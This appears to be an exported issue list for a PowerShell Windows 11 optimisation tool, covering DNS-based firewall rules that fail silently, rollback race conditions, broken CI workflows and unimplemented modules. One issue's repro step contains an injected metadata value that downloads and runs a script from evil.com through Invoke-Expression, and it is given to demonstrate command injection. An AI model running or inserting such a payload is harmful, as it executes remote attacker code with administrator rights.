issues.title: Firewall rules use DNS hostnames instead of IPs — silently fail to block traffic
issues.description: New-NetFirewallRule -RemoteAddress does NOT resolve DNS names. Passing hostnames creates rules that match nothing. Users believe telemetry is blocked when zero traffic is filtered.
issues.root_cause: Misunderstanding of Windows Firewall API — RemoteAddress expects IPs/CIDR, not hostnames.
repro_steps: Run apply.ps1 on a Windows 11 VM
Observe RemoteAddress contains hostname strings, not IPs
Observe: connection succeeds — rule has no effect

proposed_fix.summary: Resolve hostnames to IPs via Resolve-DnsName at apply time; store resolved IPs in snapshot for rollback.

issues.acceptance_criteria: Rules contain valid IP addresses; Test-NetConnection to telemetry endpoints is blocked; Microsoft Store still works.

issues.title: Rollback backup directory race condition — wrong module state restored
issues.description: All rollback scripts use 'find latest backup directory' pattern. If multiple modules create timestamped backups, rollback may restore the wrong module's data.
issues.root_cause: No module-scoped state tracking; all modules share a flat timestamp-sorted backup root.
repro_steps: Apply minimal layer (creates backup at T1)
Apply moderate layer (creates backup at T2)
Observe: rollback picks T2 backup (moderate), not T1 (minimal)

proposed_fix.summary: Implement module-scoped state file: on apply write C:\ProgramData\WinOptimizer\state\<moduleId>.json with exact backupPath. Rollback reads from state file.

issues.acceptance_criteria: After applying 2+ modules, rollback of module A reads only module A's state file and restores correct data.

issues.title: godmode.ps1 uses Invoke-Expression — command injection vector
issues.description: Invoke-Expression at lines 484, 514, 539 executes arbitrary strings from metadata.yaml. A tampered metadata file can run arbitrary code with Administrator privileges.
issues.root_cause: Using Invoke-Expression to dispatch commands from YAML metadata instead of the call operator (&).
repro_steps: Create malicious metadata.yaml with: previewCommand: 'calc.exe; Invoke-WebRequest http://evil.com/payload.ps1 | iex'
Observe: calc.exe launches and payload downloads

proposed_fix.summary: Replace all Invoke-Expression with call operator (& $scriptPath). Add whitelist validation for preview commands.

issues.acceptance_criteria: PSScriptAnalyzer reports zero PSAvoidUsingInvokeExpression violations. Malicious metadata.yaml preview commands are rejected.

issues.title: godmode.ps1 syntax errors prevent execution on PowerShell 5.1
issues.description: Line 571 uses inline if() in parameter position (PS7 only). Line 725 uses '-if' as parameter name (invalid in all PS versions). Both crash the entire orchestrator.
issues.root_cause: Code written for PS7 ternary syntax but target runtime is PS5.1 (per #Requires).
repro_steps: Observe: 'Unexpected token if' parse error at line 571

proposed_fix.summary: Precompute color variables before Write-Host calls. Replace inline if() with preceding switch/if assignment.

issues.acceptance_criteria: Script parses without error on PS5.1: [System.Management.Automation.Language.Parser]::ParseFile(path, [ref]$null, [ref]$errors) returns zero errors.

issues.title: utils.ps1 uses Export-ModuleMember in .ps1 file — runtime crash
issues.description: Export-ModuleMember only works inside .psm1 module files. Line 407 of utils.ps1 throws 'can only be called from inside a module' when dot-sourced, breaking the entire runtime.
issues.root_cause: File has .ps1 extension but uses module-only cmdlet Export-ModuleMember.
repro_steps: Observe: 'Export-ModuleMember: can only be called from inside a module'

proposed_fix.summary: Remove Export-ModuleMember call. File is dot-sourced, so all functions are naturally available in caller scope.

issues.acceptance_criteria: Dot-sourcing utils.ps1 succeeds without error. All functions accessible in caller scope.

issues.title: Missing packaging scripts — release pipeline broken
issues.description: release.yml references scripts/package.ps1 and scripts/package-and-sign.ps1 which do not exist. The scripts/ directory is empty. No releases can be published.
issues.root_cause: Scripts referenced in CI were never created.
repro_steps: Observe: release workflow fails at 'Package artifact' step

proposed_fix.summary: Create scripts/package.ps1 with version parameter, archive creation, and checksum generation.

issues.acceptance_criteria: Release workflow reaches packaging step without file-not-found error.

issues.title: AllowTelemetry=0 silently ineffective on non-Enterprise SKUs
issues.description: Setting AllowTelemetry=0 only works on Enterprise/Education editions. On Home/Pro Windows internally clamps to 1. Users believe telemetry is fully disabled when it is not.
issues.root_cause: No SKU detection before setting registry value.

proposed_fix.summary: Add SKU detection via Win32_OperatingSystem.OperatingSystemSKU. Set 0 for Enterprise/Education, 1 for others with user warning.

issues.acceptance_criteria: On Pro SKU, script sets AllowTelemetry=1 and prints warning. On Enterprise, sets 0.

issues.title: 90% of documented modules unimplemented (5 of ~55)
issues.description: Specification documents describe ~55 optimizations. Only 5 modules exist. This is a skeleton, not production software.
issues.root_cause: Project is early-stage with documentation written ahead of implementation.
repro_steps: Compare with module lists in docs/*_layer_win11.txt

proposed_fix.summary: Implement remaining modules per specification. Track in project board.

issues.acceptance_criteria: Implementation count matches documentation count per layer.

issues.title: Write-Log outputs plaintext — CLAUDE.md requires JSON structured logging
issues.description: CLAUDE.md specifies JSON logs with timestamp/layer/operation/result/rollbackRef. Current Write-Log writes plaintext strings.
issues.root_cause: Write-Log was implemented as simple text logger, not aligned to CLAUDE.md spec.

proposed_fix.summary: Replace Write-Log with JSON-emitting function per CLAUDE.md spec.

issues.acceptance_criteria: Each log line is valid JSON with timestamp, level, message, operation, layer, rollbackRef fields.

issues.title: Xbox services verify.ps1 logic inverted — flags desired state as failure
issues.description: verify.ps1 line 11 checks if StartType -eq 'Disabled' and flags as problem. But apply.ps1 sets to Manual (not Disabled). Verify incorrectly passes for Automatic (re-enabled) services.
issues.root_cause: Verify logic tests for wrong target state.
repro_steps: Observe: flags Manual services as failures, passes Automatic ones

proposed_fix.summary: Change logic to check service is Manual or Disabled AND not Running as success state.

issues.acceptance_criteria: After apply, verify.ps1 returns exit 0. With services Automatic, returns exit 1.

issues.title: disable-wer rollback incomplete — DefaultConsent not restored; duplicate in apply
issues.description: apply.ps1 sets DefaultConsent=0 (line 47-48, duplicated). rollback.ps1 never restores DefaultConsent from backup. Also apply.ps1 line 48 is an exact duplicate of line 47.
issues.root_cause: Rollback script omits DefaultConsent restore. Copy-paste duplicate in apply.

proposed_fix.summary: Remove duplicate line in apply.ps1. Add DefaultConsent backup capture and restore in rollback.ps1.

issues.acceptance_criteria: After apply+rollback, DefaultConsent equals original value.

issues.title: CI workflows reference nonexistent PowerShell/PowerShell@v2 action
issues.description: Both ci.yml and release.yml use 'PowerShell/PowerShell@v2' which does not exist as a GitHub Action. CI fails on startup.
issues.root_cause: Incorrect action reference. Windows runners include PowerShell by default.
repro_steps: Observe: CI lint job fails at 'Setup PowerShell' step

proposed_fix.summary: Remove all 'Setup PowerShell' steps. Use 'shell: pwsh' in run steps.

issues.acceptance_criteria: CI lint job reaches PSScriptAnalyzer step.

issues.title: CI integration test creates restore point on ephemeral VM
issues.description: Checkpoint-Computer in ci.yml may fail on GitHub-hosted runners that don't support System Restore.
issues.root_cause: No CI environment detection before calling Checkpoint-Computer.
repro_steps: Run CI integration test on GitHub-hosted windows-latest

proposed_fix.summary: Wrap Checkpoint-Computer in try/catch with CI detection.

issues.acceptance_criteria: CI integration test runs without error even when System Restore is unavailable.

issues.title: release.yml GPG signing step unreachable
issues.description: GPG signing step has 'if: runner.os == Linux' but job runs on self-hosted-windows-signer. Condition never true.
issues.root_cause: Mismatched runner OS condition.
repro_steps: Observe: GPG signing step is skipped

proposed_fix.summary: Change to 'if: always()' or move GPG step to a Linux job.

issues.acceptance_criteria: GPG signing step executes on release.

issues.title: upload-artifact@v3 deprecated
issues.description: Both CI workflows use actions/upload-artifact@v3 and actions/download-artifact@v3 which are deprecated.
issues.root_cause: Action version not updated.
repro_steps: Check GitHub Actions deprecation warnings in CI run

proposed_fix.summary: Upgrade to actions/upload-artifact@v4 and actions/download-artifact@v4.

issues.acceptance_criteria: No deprecation warnings in CI.

issues.title: Metadata schema mismatch between CONTRIBUTING.md and actual modules
issues.description: CONTRIBUTING.md documents fields like preview_cmd, apply_cmds, rollback_cmds. Actual modules use whatChanges, riskLevel, previewCommand.
issues.root_cause: Documentation and implementation diverged. No CI validation.
repro_steps: Compare CONTRIBUTING.md module schema with any metadata.yaml

proposed_fix.summary: Unify schema. Add CI metadata-validation job with yq/yamllint.

issues.acceptance_criteria: All metadata.yaml files pass CI schema validation.

issues.title: No '# RUN INSIDE WINDOWS VM OR CI ONLY' annotations on scripts
issues.description: None of the 20 .ps1 files contain the required execution environment annotation.
issues.root_cause: Convention not enforced at time of writing.

proposed_fix.summary: Add header comment to all .ps1 files.

issues.acceptance_criteria: All .ps1 files contain the annotation header.

issues.title: No pre-commit hook for file permissions or linting
issues.description: Spec requires non-executable files on Arch build host. No hook enforces this.
issues.root_cause: Hook never created.

proposed_fix.summary: Add CI job to fail PRs if files have execute bits set.

issues.acceptance_criteria: CI blocks PRs with executable-bit files.

issues.title: Idempotency weakness — backup directories accumulate on re-run
issues.description: Every apply.ps1 creates new timestamped backup regardless of current state. Re-running accumulates orphan directories.
issues.root_cause: No state check before backup creation.

proposed_fix.summary: Check state file before applying. If already applied, warn and exit unless -Force.

issues.acceptance_criteria: Re-running apply without -Force exits early with 'already applied' message.

issues.title: WaaSMedicSvc (protected component) listed in ultimate spec document
issues.description: docs/ultimate_layer_win11.txt line 124 lists WaaSMedicSvc. While marked 'DO NOT DISABLE', its presence in an optimization list creates risk of accidental implementation.
issues.root_cause: Protected component referenced in optimization context.

proposed_fix.summary: Remove from doc or move to dedicated 'PROTECTED - NEVER TOUCH' section.

issues.acceptance_criteria: WaaSMedicSvc not listed alongside actionable optimization items.
